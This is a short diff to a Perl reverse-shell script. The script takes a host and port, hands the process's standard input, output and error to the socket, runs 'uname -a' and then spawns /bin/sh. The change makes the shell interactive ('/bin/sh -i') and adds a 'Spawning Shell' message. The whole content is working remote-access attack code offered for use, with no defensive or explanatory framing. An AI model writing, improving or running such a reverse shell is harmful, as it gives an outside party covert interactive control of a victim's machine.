@@ -1,6 +1,6 @@
 #!/usr/bin/perl
 use IO::Socket;
-$system = '/bin/sh';
+$system = '/bin/sh -i';
 $ARGC=@ARGV;
 if ($ARGC!=2) {
 print "Usage: $0 [Host] [Port] \n\n";
@@ -19,5 +19,6 @@ open(STDIN, ">&SOCKET");
 open(STDOUT,">&SOCKET");
 open(STDERR,">&SOCKET");
 system("uname -a");
+print "[*] Spawning Shell \n";
 system($system);
 #EOF
